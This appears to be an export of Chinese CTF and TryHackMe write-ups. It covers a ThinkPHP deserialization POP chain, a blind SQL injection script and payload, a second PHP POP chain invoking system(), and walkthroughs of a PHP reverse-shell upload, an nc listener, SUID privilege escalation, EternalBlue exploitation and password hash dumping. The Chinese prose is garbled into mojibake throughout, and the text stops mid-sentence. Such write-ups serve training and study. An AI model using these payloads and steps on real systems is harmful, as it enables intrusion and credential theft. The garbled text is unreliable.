2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ› æ˜¥å­£èµ› wp CISCN-2022 Ezpop &lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this-&gt;lazySave = True; $this-&gt;data = ['whoami' =&gt; ['cat /flag.txt']]; $this-&gt;exists = True; $this-&gt;table = $obj; $this-&gt;withAttr = ['whoami' =&gt; ['system']]; $this-&gt;json = ['whoami',['whoami']]; $this-&gt;jsonAssoc = True; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\\model\\Pivot(new think\\model\\Pivot())))); } ?&gt; å‚è€ƒæ–‡ç«  ThinkPHP6.0.12LTSååºåˆ—æ¼æ´åˆ†æ 2022ç¬¬åäº”å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ›-åˆèµ›éƒ¨åˆ†WP Ezpentest è¿™é“é¢˜è®©æˆ‘æ™“å¾—ï¼Œsqlæ³¨å…¥å­¦çš„å¤ªæµ…äº† è¿™é‡Œå…ˆè‡ªå·±æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°é¡µé¢å›æ˜¾ä¼šæœ‰ä¸åŒï¼Œå¯¹ç™»å½•æ¡†åšäº†sqlæµ‹è¯•ï¼Œå‘ç°å¦‚æœæ˜¯å•çº¯çš„è´¦å·å¯†ç ä¸æ­£ç¡®ï¼Œé¡µé¢å›æ˜¾200æ•°æ®ä¸ºï¼šerror å¦‚æœæ˜¯sqlè¯­å¥é”™è¯¯ï¼Œé¡µé¢å°±å›æ˜¾500ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªç‰¹æ€§ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›²æ³¨æ¥çˆ†ç ´è´¦å·å¯†ç ï¼‰ è¿™é‡Œæˆ‘ä¸çŸ¥é“ä»–ä»¬ä»å“ªçœ‹åˆ°çš„æç¤ºï¼Œå°±ç›´æ¥cväº† function safe($a) { $r = preg_replace('/[\\s,()#;*~\\-]/','',$a); $r = preg_replace('/^.*(?=union|binary|regexp|rlike).*$/i','',$r); return (string)$r; } è¿™é‡Œå¸ˆå‚…ä»¬è¯´å‚è€ƒï¼šè™ç¬¦2022 - babysql [mysql8|æº¢å‡º|utf8mb4_bin]ï¼ˆhintï¼šmysql8çš„utf8mb4_binåº”ç”¨ï¼‰ ''ä»£æ›¿ç©ºæ ¼ï¼Œutf8mb4_bin+collateæ¥åˆ¤æ–­å¤§å°å†™é—®é¢˜ï¼Œé€šè¿‡æº¢å‡ºæŠ¥é”™æ¥ç›²æ³¨ username=0'||case'1'when`username`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'&amp;password=123 å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªé€»è¾‘ï¼š case'1'ï¼šä»¥å­—ç¬¦ä¸²'1'ä½œä¸ºæ¡ä»¶è¿›è¡Œåˆ¤æ–­ã€‚ ä¹‹åwhen:å½“usernameä»¥aå¼€å¤´(utf8mb4_binè¡¨ç¤ºå¤§å°å†™æ•æ„Ÿ)åˆ™è¿”å›1ï¼Œå¦åˆ™æ‰§è¡Œelseåé¢çš„ä¹Ÿå°±æ˜¯+9223372036854775807+1+ã€‚ æœ€åendç»“æŸcaseè¯­å¥ ä¹Ÿå°±æ˜¯è¯´æ‰§è¡ŒæˆåŠŸï¼Œé‚£é¡µé¢è‚¯å®šå›æ˜¾500ï¼ˆå› ä¸ºæº¢å‡ºæŠ¥é”™ï¼‰ï¼Œé‚£é è¿™ä¸ªç›²æ³¨å³å¯ import string import requests str=string.ascii_letters+string.digits+\"$@!^&amp;}{_%\" payload=\"0'||case'1'when`username`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'\" url='http://eci-2ze6lc580kgjg6341bqr.cloudeci1.ichunqiu.com/login.php' f=\"\" while 1: for i in str: if(i in '%_'): i=\"\\\\\"+i resp=requests.post(url=url,data={\"username\":payload.format(f+i), \"password\":\"0\"}) if(resp.status_code==500): f+=i print(f) break ä½†è¿™é‡Œæ‰‹åŠ¨æµ‹è¯•ï¼Œæˆ‘ä¸ç†è§£ä¸ºä½•æ€»æ˜¯è¿”å›500 æœ€ç»ˆçˆ†ç ´ç»“æœä¸º awk785969awlfjnlkjlii!@$%!! PAssw40d_Y0u3_Never_Konwn!@!! è¿›å»ä¹‹åï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬è¿™æ®µä»£ç è¢«è¿™ä¸ªç½‘å€åŠ å¯†äº†ï¼Œç½‘ä¸Šæ‰¾ç›¸åº”è§£å¯†è„šæœ¬å³å¯ï¼ˆä½†éƒ½å¤ªè€äº†ï¼Œå¥½éš¾ç”¨ï¼‰æˆ‘ä¹Ÿæ²¡æˆåŠŸï¼Œç›´æ¥é™„ä¸Šç»“æœäº† &lt;?php session_start(); if(!isset($_SESSION['login'])){ die(); } function Al($classname){ include $classname.\".php\"; } if(isset($_REQUEST['a'])){ $c = $_REQUEST['a']; $o = unserialize($c); if($o === false) { die(\"Error Format\"); }else{ spl_autoload_register('Al'); $o = unserialize($c); $raw = serialize($o); if(preg_match(\"/Some/i\",$raw)){ throw new Error(\"Error\"); } $o = unserialize($raw); var_dump($o); } }else { echo file_get_contents(\"SomeClass.php\"); } è¿™é‡Œæ˜¯ä¸ä½¿ç”¨å‚æ•°è®¿é—®è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥å¾—åˆ°SomeClass.phpçš„å†…å®¹ï¼š &lt;?php class A { public $a; public $b; public function see() { $b = $this-&gt;b; $checker = new ReflectionClass(get_class($b)); if(basename($checker-&gt;getFileName()) != 'SomeClass.php'){ if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b)){ ($b-&gt;a)($b-&gt;b.\"\"); } } } } class B { public $a; public $b; public function __toString() { $this-&gt;a-&gt;see(); return \"1\"; } } class C { public $a; public $b; public function __toString() { $this-&gt;a-&gt;read(); return \"lock lock read!\"; } } class D { public $a; public $b; public function read() { $this-&gt;b-&gt;learn(); } } class E { public $a; public $b; public function __invoke() { $this-&gt;a = $this-&gt;b.\" Powered by PHP\"; } public function __destruct(){ //eval($this-&gt;a); ??? å“å¾—æˆ‘èµ¶ç´§æŠŠåé—¨æ³¨é‡Šäº† //echo \"???\"; die($this-&gt;a); } } class F { public $a; public $b; public function __call($t1,$t2) { $s1 = $this-&gt;b; $s1(); } } ?&gt; spl_autoload_registerè¿™ä¸ªå‡½æ•°å°±æ˜¯è‡ªåŠ¨åŠ è½½ç±»ï¼Œå½“newä¸€ä¸ªæ²¡æœ‰åŒ…å«çš„ç±»æ—¶ï¼Œä»–å°±ä¼šè‡ªåŠ¨è°ƒç”¨A1é™æ€æ–¹æ³•æ¥åŒ…å«æ‰€éœ€çš„ç±»ã€‚ä½†æ˜¯åœ¨åé¢å¯ä»¥çœ‹åˆ°SomeClassè¢«è¿‡æ»¤äº† è¿™æ ·å¦‚æœæˆ‘ä»¬åŒ…å«è¿™ä¸ªç±»ï¼Œå°±ä¼šæŠ›å‡ºé”™è¯¯ä»è€Œç»ˆæ­¢ç¨‹åºï¼Œä½¿__destruct()æ— æ³•æ‰§è¡Œï¼Œè¿™æ ·æˆ‘ä»¬çš„é“¾å­å°±æ²¡æœ‰ç”¨äº†ã€‚ æ‰€ä»¥æˆ‘ä»¬è¦æå‰è°ƒç”¨__destruct(),åœ¨åŒ…å«SomeClassç±»çš„åŒæ—¶å°±è¿›å…¥__destruct() é“¾å­å¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹äºif(basename($checker-&gt;getFileName()) != 'SomeClass.php')éœ€è¦å°†bèµ‹å€¼ä¸ºå…¶ä»–ï¼Œä¸èƒ½ä½¿å…¶ä¸ºSomeClass &lt;?php class A { public $a; public $b; } class B { public $a; public $b; } class E { public $a; public $b; } class SomeClass { public $a; } $pop = new E(); $pop-&gt;a = new B(); $pop-&gt;a-&gt;a = new A(); $pop-&gt;a-&gt;a-&gt;b = new ErrorException(); $pop-&gt;a-&gt;a-&gt;b-&gt;a = \"system\"; $pop-&gt;a-&gt;a-&gt;b-&gt;b = \"ls /\"; $pop1 = new SomeClass(); $pop1-&gt;a = $pop; $pop1 = serialize(array($pop1,0)); echo $pop1.\" \"; $pop1 = str_replace(\"i:1\", \"i:0\", $pop1); echo $pop1.\" \"; echo urlencode($pop1); ?&gt; a%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SomeClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22E%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BO%3A14%3A%22ErrorException%22%3A10%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A22%3A%22D%3A%5CPphProject%5Cpoc1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A50%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3Bs%3A11%3A%22%00%2A%00severity%22%3Bi%3A0%3Bs%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3Bs%3A1%3A%22b%22%3Bs%3A11%3A%22%27cat+%2Fflag%27%22%3B%7D%7Ds%3A1%3A%22b%22%3BN%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D%7Di%3A0%3Bi%3A0%3B%7D è¿™é‡Œä¸çŸ¥ä¸ºä½•ï¼Œæ‰§è¡Œä¸æˆåŠŸ å‚è€ƒæ–‡ç«  [CISCN 2022 åˆèµ›]ezpentest CISCN2022åˆèµ›-Web CISCN 2022 åˆèµ› WriteUp by 0xFA","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"THM-è¿›æ”»æ€§æ¸—é€æµ‹è¯•","path":"/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/","content":"0x01 vulnversityæ¼æ´ ä¾¦æŸ¥ nmapæ‰«æç›®æ ‡æœº Nmap æ˜¯ä¸€ä¸ªå…è´¹ã€å¼€æºä¸”åŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œç”¨äºå‘ç°è®¡ç®—æœºç½‘ç»œä¸Šçš„ä¸»æœºå’ŒæœåŠ¡ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ Nmap æ‰«æè¯¥è®¡ç®—æœºä»¥è¯†åˆ«ç‰¹å®šç«¯å£ä¸Šè¿è¡Œçš„æ‰€æœ‰æœåŠ¡ã€‚ Nmap æœ‰å¾ˆå¤šåŠŸèƒ½ï¼›ä¸‹é¢çš„è¡¨æ ¼æ€»ç»“äº†å…¶ä¸€äº›åŠŸèƒ½ã€‚ Nmap Description -sV å°è¯•ç¡®å®šæ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ -p or -p- - ç«¯å£æ‰«æç«¯å£ æˆ–æ‰«ææ‰€æœ‰ç«¯å£ -Pn ç¦ç”¨ä¸»æœºå‘ç°å¹¶æ‰«æå¼€æ”¾ç«¯å£ -A å¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œæ‰§è¡Œå†…ç½®è„šæœ¬ä»¥è¿›è¡Œè¿›ä¸€æ­¥æšä¸¾ -sC ä½¿ç”¨é»˜è®¤ Nmap è„šæœ¬æ‰«æ -v è¯¦ç»†æ¨¡å¼ -sU UDPç«¯å£æ‰«æ -sS TCP SYNç«¯å£æ‰«æ è¿™é‡Œçœ‹æ–‡ç« hintè¯´æ˜¯ï¼Œåˆ©ç”¨-Oå‚æ•°è¿›è¡Œæ‰«æï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåè€Œè¿˜ä¸å¦‚ä¸Šé¢çš„-sVé€‰é¡¹æœ‰ç”¨ï¼ˆä¸Šé¢æ˜ç¡®è¯´æ˜¯ubuntu OSï¼‰ ä½¿ç”¨gobusteæ‰«æç›®å½• ä½¿ç”¨åä¸º Gobuster çš„å¿«é€Ÿç›®å½•å‘ç°å·¥å…·ï¼Œæ‚¨å°†æ‰¾åˆ°å¯ç”¨äºä¸Šä¼  shell çš„ç›®å½•ã€‚è®©æˆ‘ä»¬é¦–å…ˆæ‰«æç½‘ç«™ä»¥æŸ¥æ‰¾ä»»ä½•éšè—çš„ç›®å½•ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Gobusterã€‚ Gobuster æ˜¯ä¸€ä¸ªç”¨äºæš´åŠ›ç ´è§£ URIï¼ˆç›®å½•å’Œæ–‡ä»¶ï¼‰ã€DNS å­åŸŸå’Œè™šæ‹Ÿä¸»æœºåçš„å·¥å…·ã€‚å¯¹äºè¿™å°æœºå™¨ï¼Œæˆ‘ä»¬å°†é‡ç‚¹ä½¿ç”¨å®ƒæ¥æš´åŠ›ç ´è§£ç›®å½•ã€‚ åœ¨è¿™é‡Œä¸‹è½½ Gobusterï¼Œæˆ–è€…å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Kali Linuxï¼Œè¯·è¿è¡Œ sudo apt-get install gobuster é¦–å…ˆï¼Œæ‚¨éœ€è¦ä¸€ä¸ª Gobuster çš„å•è¯åˆ—è¡¨ï¼ˆå®ƒå°†ç”¨äºå¿«é€Ÿæµè§ˆå•è¯åˆ—è¡¨ä»¥ç¡®å®šå…¬å…±ç›®å½•æ˜¯å¦å¯ç”¨ã€‚å¦‚æœæ‚¨ä½¿ç”¨ Kali Linuxï¼Œæ‚¨å¯ä»¥åœ¨ /usr/share/wordlists ä¸‹æ‰¾åˆ°è®¸å¤šå•è¯åˆ—è¡¨ï¼‰æ‚¨è¿˜å¯ä»¥åœ¨ AttackBox ä¸­ä½¿ç”¨ä½äº /usr/share/wordlists/dirbuster/directory-list-1.0.txt çš„ç›®å½•çš„å•è¯åˆ—è¡¨ã€‚ ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨ gobuster dir -u http://10.10.127.89:3333 -w è¿è¡Œå¸¦æœ‰å•è¯åˆ—è¡¨çš„ Gobuster Gobuster flag Description -e åœ¨æ§åˆ¶å°ä¸­æ‰“å°å®Œæ•´çš„ URL -u ç›®æ ‡ç½‘å€ -w å•è¯åˆ—è¡¨çš„è·¯å¾„ -U and -P åŸºæœ¬èº«ä»½éªŒè¯çš„ç”¨æˆ·åå’Œå¯†ç  -p ç”¨äºè¯·æ±‚çš„ä»£ç† -c æŒ‡å®šä¸€ä¸ª cookie æ¥æ¨¡æ‹Ÿæ‚¨çš„èº«ä»½éªŒè¯ gobuster dir -u http://10.10.127.89:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt å…¥ä¾µç½‘ç»œæœåŠ¡å™¨ ç°åœ¨æ‚¨å·²ç»æ‰¾åˆ°äº†ä¸Šä¼ æ–‡ä»¶çš„è¡¨å•ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¸Šä¼ å¹¶æ‰§è¡Œæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ï¼Œè¿™å°†å¯¼è‡´ç½‘ç»œæœåŠ¡å™¨å—åˆ°æŸå®³ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨ Intruderï¼ˆç”¨äºè‡ªåŠ¨åŒ–å®šåˆ¶æ”»å‡»ï¼‰ã€‚é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªå…·æœ‰ä»¥ä¸‹æ‰©å±•åçš„å•è¯åˆ—è¡¨ï¼š .php .php3 .php4 .php5 .phtml ç°åœ¨ç¡®ä¿ BurpSuite é…ç½®ä¸ºæ‹¦æˆªæ‰€æœ‰æµè§ˆå™¨æµé‡ã€‚ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶;ä¸€æ—¦æ•è·è¯¥è¯·æ±‚ï¼Œå°†å…¶å‘é€ç»™å…¥ä¾µè€…ã€‚å•å‡»â€œæœ‰æ•ˆè´Ÿè½½â€å¹¶é€‰æ‹©â€œç‹™å‡»æ‰‹â€æ”»å‡»ç±»å‹ã€‚ ç°åœ¨å•å‡»â€œä½ç½®â€é€‰é¡¹å¡ï¼Œæ‰¾åˆ°æ–‡ä»¶åå¹¶â€œæ·»åŠ Â§â€åˆ°æ‰©å±•åã€‚å®ƒåº”è¯¥çœ‹èµ·æ¥åƒè¿™æ ·ï¼š è¿™é‡Œæˆ‘è¿˜å› ä¸ºåç¼€è¢«urlç¼–ç å¯¼è‡´ä¸€ç›´å‡ºé”™ã€‚ã€‚ã€‚ã€‚ç°åœ¨æˆ‘ä»¬çŸ¥é“å¯ä»¥ä¸ºæœ‰æ•ˆè´Ÿè½½ä½¿ç”¨ä»€ä¹ˆæ‰©å±•ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­å‰è¿›äº†ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨ PHP åå‘ shell ä½œä¸ºæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚åå‘ shell çš„å·¥ä½œåŸç†æ˜¯åœ¨è¿œç¨‹ä¸»æœºä¸Šè°ƒç”¨å¹¶å¼ºåˆ¶è¯¥ä¸»æœºä¸æ‚¨å»ºç«‹è¿æ¥ã€‚å› æ­¤ï¼Œæ‚¨å°†ä¾¦å¬ä¼ å…¥çš„è¿æ¥ï¼Œä¸Šä¼ å¹¶æ‰§è¡Œ shellï¼Œè¿™å°†å‘æ‚¨å‘å‡ºæ§åˆ¶ä¿¡å·ï¼ åœ¨æ­¤å¤„ä¸‹è½½ä»¥ä¸‹åå‘ PHP shellã€‚ è¦è¿œç¨‹è®¿é—®æ­¤è®¡ç®—æœºï¼Œè¯·æŒ‰ç…§ä¸‹åˆ—æ­¥éª¤æ“ä½œï¼š ç¼–è¾‘ php-reverse-shell.php æ–‡ä»¶å¹¶å°† ip ç¼–è¾‘ä¸ºæ‚¨çš„ tun0 ipï¼ˆæ‚¨å¯ä»¥é€šè¿‡åœ¨ TryHackMe è¿æ¥è®¾å¤‡çš„æµè§ˆå™¨ä¸­è®¿é—® http://10.10.10.10 æ¥è·å–æ­¤ä¿¡æ¯ï¼‰ã€‚ å°†æ­¤æ–‡ä»¶é‡å‘½åä¸º php-reverse-shell.phtml æˆ‘ä»¬ç°åœ¨å°†ä½¿ç”¨ netcat ç›‘å¬ä¼ å…¥è¿æ¥ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼šnc -lvnp 1234 ä¸Šä¼ æ‚¨çš„ shell å¹¶å¯¼èˆªåˆ° http://10.10.127.89:3333/internal/uploads/php-reverse-shell.phtml - è¿™å°†æ‰§è¡Œæ‚¨çš„æœ‰æ•ˆè´Ÿè½½ æ‚¨åº”è¯¥åœ¨ Netcat ä¼šè¯ä¸Šçœ‹åˆ°ä¸€ä¸ªè¿æ¥ æƒé™æå‡ ç°åœ¨æ‚¨å·²ç»å…¥ä¾µäº†è¿™å°æœºå™¨ï¼Œæˆ‘ä»¬å°†å‡çº§æƒé™å¹¶æˆä¸ºè¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰ã€‚ åœ¨ Linux ä¸­ï¼ŒSUIDï¼ˆæ‰§è¡Œæ—¶è®¾ç½®æ‰€æœ‰è€… userIdï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§ç‰¹å®šç±»å‹çš„æ–‡ä»¶æƒé™ã€‚ SUID å‘ç”¨æˆ·æˆäºˆä¸´æ—¶æƒé™ï¼Œä»¥åœ¨æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆè€Œä¸æ˜¯è¿è¡Œå®ƒçš„ç”¨æˆ·ï¼‰çš„è®¸å¯ä¸‹è¿è¡Œç¨‹åº/æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼Œç”¨äºæ›´æ”¹å¯†ç çš„äºŒè¿›åˆ¶æ–‡ä»¶å…·æœ‰è®¾ç½®äº† SUID ä½ (/usr/bin/passwd)ã€‚è¿™æ˜¯å› ä¸ºè¦æ›´æ”¹å¯†ç ï¼Œå®ƒå°†éœ€è¦å†™å…¥æ‚¨æ— æƒè®¿é—®ä½† root æœ‰æƒè®¿é—®çš„ shadow æ–‡ä»¶ï¼Œå› æ­¤å®ƒå…·æœ‰ root æƒé™æ¥è¿›è¡Œæ­£ç¡®çš„æ›´æ”¹ã€‚ æœç´¢çš„å‘½ä»¤ä¸ºï¼šfind / -perm -u=s -type f 2&gt;/dev/null è¿™é‡Œçš„æ‰‹æ³•å¯ä»¥å‚è€ƒï¼šhttps://gtfobins.github.io/gtfobins/systemctl/ä»¥åŠ æƒé™æå‡ | å¸¦SUIDçš„å‘½ä»¤ææƒ è¿™é‡Œæ€è·¯å°±æ˜¯å°†/bin/bashå‘½ä»¤èµ‹å€¼åˆ°tmpä¸´æ—¶ç›®å½•ä¸‹ï¼Œå¹¶ä¸”ç»™è¯¥ç›®å½•å¢åŠ +s rootæƒé™ï¼Œä»¥è‡³äºåç»­å¯ä»¥ä»¥rootçš„èº«ä»½æ‰§è¡Œï¼Œä¸è‡³äºæ— æƒè®¿é—®ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿèƒ½å†™ä¸Šbashåå¼¹shell è¿™é‡Œä¹Ÿè¡¥å……ä¸€ä¸ªä¸œè¥¿ï¼Œæ‰¾åˆ°www-dataå¯ä»¥å†™å…¥çš„ç›®å½• find / -type f -maxdepth 2 -writable find / -type d -maxdepth 2 -writable æ€»ç»“ è¿™é“é¢˜ç›®æ€è·¯æ˜¯å…ˆå¸¸è§„nmapæ‰«æï¼Œå‘ç°æ•æ„Ÿç«¯å£ï¼Œæ¥ç€è®¿é—®webç«™ç‚¹ï¼Œæµ‹è¯•ä¸€æ³¢åŠŸèƒ½ç‚¹å‘ç°æ–‡ä»¶ä¸Šä¼ ï¼Œæ¥ç€fuzzå¯ä»¥ä¸Šä¼ çš„åç¼€ï¼Œå‘ç°phtmlå¯ä»¥ä¸Šä¼ ï¼Œä¹‹åå°±æ˜¯ä¸Šä¼ å¯ä»¥åå¼¹shellé©¬ï¼Œæ‹¿åˆ°shellä¹‹åï¼Œå°±æ˜¯ææƒäº†ï¼Œè¿™é‡Œç”¨åˆ°çš„å°±æ˜¯suidææƒã€‚ 0x02 blueæŒ‘æˆ˜ ä¾¦æŸ¥ æ‰«æå¹¶äº†è§£è¯¥æœºå™¨å®¹æ˜“å—åˆ°å“ªäº›æ”»å‡»ã€‚è¯·æ³¨æ„ï¼Œè¯¥è®¡ç®—æœºä¸å“åº” ping (ICMP)ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿæ‰èƒ½å¯åŠ¨ã€‚è¿™ä¸ªæˆ¿é—´å¹¶ä¸æ˜¯ä¸€ä¸ª boot2root CTFï¼Œè€Œæ˜¯ä¸€ä¸ªé’ˆå¯¹å®Œå…¨åˆå­¦è€…çš„æ•™è‚²ç³»åˆ—ã€‚é™¤äº†åŸºæœ¬ç»ƒä¹ ä¹‹å¤–ï¼Œä¸“ä¸šäººå£«åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå¯èƒ½ä¸ä¼šå¾—åˆ°ä»€ä¹ˆï¼Œå› ä¸ºè¿™é‡Œçš„è¿‡ç¨‹æ˜¯é’ˆå¯¹åˆå­¦è€…çš„ã€‚ nmap -sV -p- -Pn -T4 10.10.176.146 è®¿é—®è·å–æƒé™ åˆ©ç”¨æœºå™¨å¹¶ç«™ç¨³è„šè·Ÿã€‚ æå‡æƒé™ å‡çº§æƒé™ï¼Œäº†è§£å¦‚ä½•åœ¨ Metasploit ä¸­å‡çº§ shellã€‚ ä¸Šè¿°å¯ä»¥çœ‹åˆ°å­˜åœ¨SMB ms17-010æ¼æ´ï¼Œè¿™é‡Œé€‰æ‹©æ°¸æ’ä¹‹è“æ¥åˆ©ç”¨ è®¾ç½®å¥½ç›¸å…³å‚æ•°ï¼Œå³å¯ç›´æ¥run æ‹¿åˆ°shellä¹‹åï¼Œæˆ‘ä»¬é€€åˆ°åå°ï¼Œå°è¯•å°†è¯¥åå¼¹shellè½¬æ¢ä¸ºmeterpreterç±»å‹çš„shell æœå¯»ä¸€ç•ªå¯ä»¥å‘ç°è¯¥æ¨¡å—ï¼špost/multi/manage/shell_to_meterpreter å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè®¾ç½®ç›¸å…³å‚æ•° ç›´æ¥runè¿è¡Œï¼Œä¹‹åä¼šçœ‹åˆ°æ–°å¢ä¸€ä¸ªä¼šè¯ åˆ‡æ¢åˆ°ä¼šè¯3ï¼Œå¹¶ä¸”çœ‹åˆ°æˆ‘ä»¬å½“å‰çš„æƒé™å°±æ˜¯systemï¼ˆNT AUTHORITY\\SYSTEMï¼‰ é€šè¿‡å‘½ä»¤â€œshellâ€æ‰“å¼€ dos shell å¹¶è¿è¡Œâ€œwhoamiâ€ã€‚è¿™åº”è¯¥è¡¨æ˜æˆ‘ä»¬ç¡®å®æ˜¯ä¸€ä¸ªç³»ç»Ÿã€‚ä¹‹åå°†æ­¤ shell ç½®äºåå°å¹¶å†æ¬¡é€‰æ‹©æˆ‘ä»¬çš„ meterpreter ä¼šè¯ä»¥ä¾›ä½¿ç”¨ã€‚ åˆ—å‡ºé€šè¿‡â€œpsâ€å‘½ä»¤è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹ã€‚ä»…ä»…å› ä¸ºæˆ‘ä»¬æ˜¯ç³»ç»Ÿå¹¶ä¸æ„å‘³ç€æˆ‘ä»¬çš„æµç¨‹æ˜¯ã€‚åœ¨æ­¤åˆ—è¡¨åº•éƒ¨æ‰¾åˆ°ä¸€ä¸ªåœ¨ NT AUTHORITY\\SYSTEM è¿è¡Œçš„è¿›ç¨‹ï¼Œå¹¶è®°ä¸‹è¿›ç¨‹ IDï¼ˆæœ€å·¦åˆ—ï¼‰ã€‚ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©2652çš„è¿›ç¨‹id ä½¿ç”¨â€œmigrate PROCESS_IDâ€å‘½ä»¤è¿ç§»åˆ°æ­¤è¿›ç¨‹ï¼Œå…¶ä¸­è¿›ç¨‹ ID æ˜¯æ‚¨åˆšåˆšåœ¨ä¸Šä¸€æ­¥ä¸­è®°ä¸‹çš„ IDã€‚è¿™å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ï¼Œè¿ç§»è¿‡ç¨‹ä¸æ˜¯å¾ˆç¨³å®šã€‚å¦‚æœå¤±è´¥ï¼Œæ‚¨å¯èƒ½éœ€è¦é‡æ–°è¿è¡Œè½¬æ¢è¿‡ç¨‹æˆ–é‡æ–°å¯åŠ¨è®¡ç®—æœºå¹¶å†æ¬¡å¯åŠ¨ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè¯·ä¸‹æ¬¡å°è¯•ä¸åŒçš„è¿‡ç¨‹ã€‚ è¿™é‡Œä¹Ÿæ˜¯å°è¯•äº†å¤šä¸ªè¿›ç¨‹ï¼Œå‘ç°å¾ˆå¤šéƒ½æ˜¾ç¤ºæ²¡æœ‰æƒé™ï¼Œ2912æ°å¥½ç¬¦åˆ ç ´è§£ è½¬å‚¨éé»˜è®¤ç”¨æˆ·çš„å¯†ç å¹¶ç ´è§£å®ƒï¼ åœ¨æˆ‘ä»¬æå‡çš„ meterpreter shell ä¸­ï¼Œè¿è¡Œå‘½ä»¤â€œhashdumpâ€ã€‚åªè¦æˆ‘ä»¬æœ‰æ­£ç¡®çš„æƒé™ï¼Œè¿™å°±ä¼šè½¬å‚¨è®¡ç®—æœºä¸Šçš„æ‰€æœ‰å¯†ç ã€‚éé»˜è®¤ç”¨æˆ·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ è¿™é‡Œå¯ä»¥ç”¨johnæˆ–è€…åœ¨çº¿ç½‘ç«™ç ´è§£ è¿™é‡Œæˆ‘äº†è§£äº†ä¸€ä¸‹ä¸Šè¿°NTæ ¼å¼çš„å«ä¹‰ï¼š--format=NAME nameæŒ‡å®šå¯†æ–‡æ ¼å¼,æŒ‡å®šå¯†æ–‡æ ¼å¼åç§°,ä¸ºDES/BSDI/MD5/BF/AFS/LMæŒ‡å®šä½¿ç”¨æŸç§å¯†æ–‡æ ¼å¼è¿›è¡Œç ´è§£ å…·ä½“å‚è€ƒï¼šhttps://doc.gui.run/docs/security_tools/security_tools-1e06j26453ols å¯»æ‰¾flag æ‰¾åˆ°è¿™å°æœºå™¨ä¸Šæ’ç€çš„ä¸‰é¢æ——å¸œã€‚è¿™äº›ä¸æ˜¯ä¼ ç»Ÿçš„æ ‡å¿—ï¼Œè€Œæ˜¯ä»£è¡¨ Windows ç³»ç»Ÿä¸­çš„å…³é”®ä½ç½®ã€‚ä½¿ç”¨ä¸‹é¢æä¾›çš„æç¤ºæ¥å®Œæˆè¿™ä¸ªæˆ¿é—´ï¼ æ ‡å¿—1ï¼šè¯¥æ ‡å¿—å¯ä»¥åœ¨ç³»ç»Ÿæ 